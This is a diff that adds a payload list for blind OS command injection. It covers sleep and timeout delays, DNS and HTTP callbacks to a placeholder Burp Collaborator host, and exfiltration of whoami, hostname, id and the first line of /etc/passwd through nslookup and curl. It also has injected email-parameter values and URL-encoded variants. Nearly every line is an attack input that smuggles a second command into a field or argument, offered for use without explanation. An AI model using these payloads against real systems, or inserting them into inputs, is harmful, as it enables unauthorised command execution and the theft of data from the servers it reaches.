@@ -1,0 +1,204 @@
+# ==================== TIME DELAY PAYLOADS (LINUX) ====================
+sleep 5
+sleep 10
+sleep 20
+sleep 30
+sleep 60
+sleep 5 &
+sleep 5; sleep 10
+sleep 5 && sleep 10
+`sleep 5`
+$(sleep 5)
+|sleep 5|
+||sleep 5||
+&sleep 5&
+&&sleep 5&&
+;sleep 5;
+%0asleep 5
+%0asleep 5%0a
+%0d%0asleep 5
+sleep 5 #
+sleep 5; # comment
+sleep 5 & # comment
+sleep 5 > /dev/null 2>&1
+sleep 5 2>&1 > /dev/null
+(sleep 5)
+{sleep 5}
+
+# ==================== TIME DELAY PAYLOADS (WINDOWS) ====================
+timeout 5
+timeout 10
+ping -n 5 127.0.0.1
+ping -n 10 127.0.0.1
+ping -n 5 127.0.0.1 > nul
+timeout 5 > nul
+waitfor /T 5 pause
+choice /T 5 /N /D Y
+ping -n 5 127.0.0.1 & timeout 5
+%0atimeout 5
+%0atimeout 5%0a
+timeout 5 #
+timeout 5 & # comment
+
+# ==================== DNS CALLBACK (BURP COLLABORATOR) ====================
+nslookup YOUR-COLLABORATOR.burpcollaborator.net
+ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net
+ping -n 5 YOUR-COLLABORATOR.burpcollaborator.net
+dig YOUR-COLLABORATOR.burpcollaborator.net
+host YOUR-COLLABORATOR.burpcollaborator.net
+nslookup YOUR-COLLABORATOR.burpcollaborator.net 8.8.8.8
+ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net 8.8.8.8
+
+# ==================== DNS CALLBACK WITH CHAINING ====================
+||nslookup YOUR-COLLABORATOR.burpcollaborator.net||
+|nslookup YOUR-COLLABORATOR.burpcollaborator.net|
+;nslookup YOUR-COLLABORATOR.burpcollaborator.net;
+&nslookup YOUR-COLLABORATOR.burpcollaborator.net&
+&&nslookup YOUR-COLLABORATOR.burpcollaborator.net&&
+%0anslookup YOUR-COLLABORATOR.burpcollaborator.net%0a
+$(nslookup YOUR-COLLABORATOR.burpcollaborator.net)
+`nslookup YOUR-COLLABORATOR.burpcollaborator.net`
+nslookup YOUR-COLLABORATOR.burpcollaborator.net #
+nslookup YOUR-COLLABORATOR.burpcollaborator.net; # comment
+
+# ==================== HTTP CALLBACK ====================
+curl http://YOUR-COLLABORATOR.burpcollaborator.net
+wget http://YOUR-COLLABORATOR.burpcollaborator.net
+curl -s http://YOUR-COLLABORATOR.burpcollaborator.net
+wget -q http://YOUR-COLLABORATOR.burpcollaborator.net
+curl http://YOUR-COLLABORATOR.burpcollaborator.net -o /dev/null
+wget http://YOUR-COLLABORATOR.burpcollaborator.net -O /dev/null
+||curl http://YOUR-COLLABORATOR.burpcollaborator.net||
+;curl http://YOUR-COLLABORATOR.burpcollaborator.net;
+&curl http://YOUR-COLLABORATOR.burpcollaborator.net&
+%0acurl http://YOUR-COLLABORATOR.burpcollaborator.net%0a
+
+# ==================== TIME DELAY + DNS CALLBACK ====================
+sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net
+sleep 5 | nslookup YOUR-COLLABORATOR.burpcollaborator.net
+sleep 5; nslookup YOUR-COLLABORATOR.burpcollaborator.net
+sleep 5 || nslookup YOUR-COLLABORATOR.burpcollaborator.net
+$(sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net)
+`sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net`
+;sleep 5; nslookup YOUR-COLLABORATOR.burpcollaborator.net;
+&sleep 5& nslookup YOUR-COLLABORATOR.burpcollaborator.net&
+%0asleep 5%0anslookup YOUR-COLLABORATOR.burpcollaborator.net%0a
+
+# ==================== TIME DELAY + HTTP CALLBACK ====================
+sleep 5 && curl http://YOUR-COLLABORATOR.burpcollaborator.net
+sleep 5; wget http://YOUR-COLLABORATOR.burpcollaborator.net
+$(sleep 5 && curl -s http://YOUR-COLLABORATOR.burpcollaborator.net)
+`sleep 5 && wget -q http://YOUR-COLLABORATOR.burpcollaborator.net`
+;sleep 5; curl http://YOUR-COLLABORATOR.burpcollaborator.net;
+&sleep 5& wget http://YOUR-COLLABORATOR.burpcollaborator.net&
+%0asleep 5%0acurl http://YOUR-COLLABORATOR.burpcollaborator.net%0a
+
+# ==================== DATA EXFILTRATION VIA DNS ====================
+nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net
+nslookup $(whoami).YOUR-COLLABORATOR.burpcollaborator.net
+nslookup `hostname`.YOUR-COLLABORATOR.burpcollaborator.net
+nslookup `id`.YOUR-COLLABORATOR.burpcollaborator.net
+nslookup `pwd`.YOUR-COLLABORATOR.burpcollaborator.net
+nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net 8.8.8.8
+||nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net||
+||nslookup $(whoami).YOUR-COLLABORATOR.burpcollaborator.net||
+;nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net;
+&nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net&
+%0anslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net%0a
+$(nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net)
+`nslookup \`whoami\`.YOUR-COLLABORATOR.burpcollaborator.net`
+
+# ==================== DATA EXFILTRATION VIA HTTP ====================
+curl http://YOUR-COLLABORATOR.burpcollaborator.net/`whoami`
+curl http://YOUR-COLLABORATOR.burpcollaborator.net/$(whoami)
+wget http://YOUR-COLLABORATOR.burpcollaborator.net/`hostname`
+curl -X POST http://YOUR-COLLABORATOR.burpcollaborator.net -d "data=`whoami`"
+curl http://YOUR-COLLABORATOR.burpcollaborator.net/`cat /etc/passwd | head -1`
+||curl http://YOUR-COLLABORATOR.burpcollaborator.net/`whoami`||
+;curl http://YOUR-COLLABORATOR.burpcollaborator.net/$(whoami);
+&wget http://YOUR-COLLABORATOR.burpcollaborator.net/`hostname`&
+
+# ==================== EMAIL PARAMETER PAYLOADS ====================
+email=||nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net||
+email=||nslookup $(whoami).YOUR-COLLABORATOR.burpcollaborator.net||
+email=;nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net;
+email=&nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net&
+email=|nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net|
+email=%0anslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net%0a
+email=test@example.com||nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net||
+email=test@example.com;sleep 5;
+email=test@example.com||sleep 5||
+
+# ==================== WINDOWS DATA EXFILTRATION ====================
+nslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net
+nslookup %COMPUTERNAME%.YOUR-COLLABORATOR.burpcollaborator.net
+ping -n 5 %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net
+||nslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net||
+|nslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net|
+;nslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net;
+&nslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net&
+%0anslookup %USERNAME%.YOUR-COLLABORATOR.burpcollaborator.net%0a
+
+# ==================== ADVANCED CHAINING PAYLOADS ====================
+;sleep 5; nslookup YOUR-COLLABORATOR.burpcollaborator.net; whoami;
+|sleep 5| nslookup YOUR-COLLABORATOR.burpcollaborator.net| whoami|
+||sleep 5|| nslookup YOUR-COLLABORATOR.burpcollaborator.net|| whoami||
+&sleep 5& nslookup YOUR-COLLABORATOR.burpcollaborator.net& whoami&
+&&sleep 5&& nslookup YOUR-COLLABORATOR.burpcollaborator.net&& whoami&&
+%0asleep 5%0anslookup YOUR-COLLABORATOR.burpcollaborator.net%0awhoami%0a
+sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net && whoami
+(sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net)
+{sleep 5 && nslookup YOUR-COLLABORATOR.burpcollaborator.net}
+
+# ==================== BLIND ONLY (NO OUTPUT, ONLY TIME) ====================
+sleep 5 > /dev/null 2>&1
+sleep 10 2>&1 > /dev/null
+timeout 5 > nul 2>&1
+ping -n 5 127.0.0.1 > nul 2>&1
+ping -c 5 127.0.0.1 > /dev/null 2>&1
+nslookup YOUR-COLLABORATOR.burpcollaborator.net > /dev/null 2>&1
+curl http://YOUR-COLLABORATOR.burpcollaborator.net -s -o /dev/null
+wget http://YOUR-COLLABORATOR.burpcollaborator.net -q -O /dev/null
+||sleep 5 > /dev/null 2>&1||
+;sleep 5 > /dev/null 2>&1;
+&sleep 5 > /dev/null 2>&1&
+%0asleep 5 > /dev/null 2>&1%0a
+
+# ==================== ENCODED PAYLOADS ====================
+%73%6c%65%65%70%20%35
+%73%6c%65%65%70%20%31%30
+%6e%73%6c%6f%6f%6b%75%70%20%59%4f%55%52%2d%43%4f%4c%4c%41%42%4f%52%41%54%4f%52%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74
+%7C%7Cnslookup%20%60whoami%60.YOUR-COLLABORATOR.burpcollaborator.net%7C%7C
+%3Bnslookup%20%60whoami%60.YOUR-COLLABORATOR.burpcollaborator.net%3B
+%26nslookup%20%60whoami%60.YOUR-COLLABORATOR.burpcollaborator.net%26
+%0anslookup%20%60whoami%60.YOUR-COLLABORATOR.burpcollaborator.net%0a
+sleep%205
+sleep%2010
+%3Bsleep%205%3B
+%26sleep%205%26
+%7Csleep%205%7C
+
+# ==================== BURP COLLABORATOR PING (DNS) ====================
+||ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net||
+||ping -n 5 YOUR-COLLABORATOR.burpcollaborator.net||
+;ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net;
+&ping -n 5 YOUR-COLLABORATOR.burpcollaborator.net&
+|ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net|
+`ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net`
+$(ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net)
+%0aping -c 5 YOUR-COLLABORATOR.burpcollaborator.net%0a
+
+# ==================== TEST ALL PARAMETERS (UNIVERSAL) ====================
+||sleep 5||
+;sleep 5;
+&sleep 5&
+|sleep 5|
+&&sleep 5&&
+||nslookup YOUR-COLLABORATOR.burpcollaborator.net||
+;nslookup YOUR-COLLABORATOR.burpcollaborator.net;
+&nslookup YOUR-COLLABORATOR.burpcollaborator.net&
+|nslookup YOUR-COLLABORATOR.burpcollaborator.net|
+||nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net||
+;nslookup `whoami`.YOUR-COLLABORATOR.burpcollaborator.net;
+||curl http://YOUR-COLLABORATOR.burpcollaborator.net||
+||wget http://YOUR-COLLABORATOR.burpcollaborator.net||
